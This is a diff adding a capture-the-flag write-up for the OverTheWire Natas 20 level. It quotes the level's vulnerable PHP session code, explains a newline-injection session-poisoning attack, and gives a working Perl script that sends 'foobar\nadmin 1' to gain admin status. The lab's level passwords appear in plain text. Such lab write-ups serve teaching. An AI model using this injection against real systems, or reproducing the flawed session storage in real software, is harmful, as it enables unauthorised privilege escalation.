@@ -887,3 +887,124 @@ Attempt with 280 failed
 Succeeded with 281:
  </html> an admin. The credentials for the next level are:<br><pre>Username: natas20 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>script>
 ```
+
+## Natas 20 - poison pill
+
+Natas 20 is rather simple. From reading the source code we see many distractions, but the point of focus is the print_credentials method that shows us that if there is a session with key `admin` and value `1` the admin creds will be displayed.
+
+```php
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+```
+
+ We also notice that the coder decided to implement the session loading and persistence on his own.
+
+```php
+
+function myread($sid) { 
+    debug("MYREAD $sid"); 
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) { 
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data"); 
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+```
+
+Where he is basically storing our name, POSTed from the on-page form, on a text file that holds session data, which on subsequent requests for the same session is reloaded by parsing through this text file.
+
+The parsing itself is simple: one key val per line, so
+
+```
+key1 val1
+key2 val2
+...
+```
+
+Such that if we get to poison this text file with our `admin` key and `1` value we hit jackpot.
+
+This attack consisted in three consecutive requests:
+
+1. Creates a session for us (and that is why this time we use a Cookie jar on LWP::UserAgent->new, such that the following requests send session data along)
+1. Send a malicious request that will poison the session persistence
+1. Send any request that will read the poisoned session data and show us the admin creds.
+
+```perl
+#!/usr/bin/perl
+use strict;
+use warnings;
+use v5.10;
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use HTTP::Cookies;
+use Try::Tiny;
+
+my $url = 'http://natas20.natas.labs.overthewire.org/index.php?debug=1';
+my $ua = LWP::UserAgent->new(
+  cookie_jar => HTTP::Cookies->new()
+);
+
+sub make_request_with {
+  my $request = POST $url, Content => [ name => shift ];
+  $request->authorization_basic('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF');
+  my $response = $ua->request($request);
+  print $response->content;
+}
+
+# make first request to create session
+make_request_with("foobar");
+
+# make second request with malicious payload so poison session
+make_request_with("foobar\nadmin 1");
+
+# make third request to load poisoned session
+make_request_with("foobar\nadmin 1");
+```
+
+Et voila:
+
+```html
+<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
+```
